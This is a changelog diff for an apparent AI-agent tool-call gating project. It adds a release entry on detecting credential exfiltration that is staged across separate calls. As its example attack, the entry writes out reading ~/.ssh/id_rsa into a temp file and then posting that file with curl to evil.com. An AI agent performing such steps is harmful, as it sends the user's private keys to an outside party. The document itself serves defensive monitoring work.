@@ -8,6 +8,43 @@ Versions follow [Semantic Versioning](https://semver.org/).
 
 ## [Unreleased]
 
+## [0.2.0] — 2026-06-05 (updated)
+
+### Added — Staged / Cross-Call Credential Exfiltration Detection (ADR-037 F28)
+
+- **feat(taint-egress): F28 `taint-egress-consent` — ESCALATE tier for staged exfil** —
+  Closes the cross-call credential exfil gap left open by F27 (single-call only). Attack:
+  read `~/.ssh/id_rsa` into `/tmp/x` in call A, then `curl -d @/tmp/x https://evil.com`
+  in call B. F27 did not fire; F28 now routes this to stop-and-ask with REAL args
+  (the tainted file + destination host). Approve ⇒ bespoke `(host, filePathHash)` session
+  grant; in-scope calls silent thereafter. Deny / no-TTY / unattended ⇒ fail-closed block.
+
+- **feat(taint-egress): deterministic injection seam** — provenance graph loaded at the
+  impure `pretool-gate.js` boundary and injected as `input.provenanceGraph` (gated on
+  `LILARA_TAINT_EGRESS=1`). `evalTaintEgressFloor` returns `{fired:false}` immediately
+  when `provenanceGraph` is null → byte-identical replay with zero divergence when off.
+
+- **feat(taint-egress): bespoke `(host, filePathHash)` grant scope** — bypasses the
+  general `scopesMatch` engine (which has no network branch) via a predicate-level check.
+  Re-asks only when the file or host changes; same pair is silent after first approval.
+
+- **feat(taint-egress): F23 graph-injection alignment** — `floor-f23.js` now honors
+  `input.provenanceGraph` via the canonical `input.X ?? loader()` injection pattern,
+  narrowing the pre-existing in-decide-load determinism gap without widening it.
+
+- **feat(taint-egress): credClass tagging on provenance source nodes** — at PostToolUse
+  (`post-adapter-factory.js`), source nodes and derivative nodes are tagged `credClass:true`
+  when the F27-narrow credential signals fire (`CRED_PATH_PATTERNS` + `scanSecrets`).
+  Gated on `LILARA_TAINT_EGRESS`; off = no new fields = byte-identical graph.
+
+- **feat(taint-egress): CI gate** (`scripts/check-taint-egress.sh`) — asserts F28
+  lattice/demotability, inertness, positive structural detection, grant suppression,
+  class narrowing, and the unit test suite (19 tests).
+
+- **feat(taint-egress): ADR-037** (`references/adr-037-staged-exfil-taint.md`) — documents
+  the threat model, escalate-not-inviolable rationale, determinism/injection story,
+  bespoke grant model, scope limits, and deferred seams. Neutral universal-harm language.
+
 ## [0.2.0] — 2026-06-04
 
 ### Added — Scope-Based Consent Gate (ADR-035)
